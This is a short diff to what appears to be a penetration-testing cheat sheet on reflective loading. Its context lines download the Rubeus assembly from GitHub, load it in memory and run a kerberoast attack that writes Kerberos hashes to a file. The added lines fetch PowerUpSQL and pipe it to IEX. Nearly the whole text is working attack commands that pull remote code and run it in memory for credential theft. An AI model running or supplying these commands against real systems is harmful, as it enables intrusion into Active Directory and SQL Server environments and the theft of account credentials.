@@ -11,3 +11,7 @@ $data = (New-Object System.Net.WebClient).DownloadData('https://raw.githubuserco
 $assem = [System.Reflection.Assembly]::Load($data)
 [Rubeus.Program]::Main("kerberoast /outfile:C:\temp\hashes.txt".Split())
 ```
+PowerUpSQL
+```powershell
+(new-object system.net.webclient).downloadstring('https://raw.githubusercontent.com/wez3/reflective-loading/main/PowerUpSQL.ps1') | IEX
+```
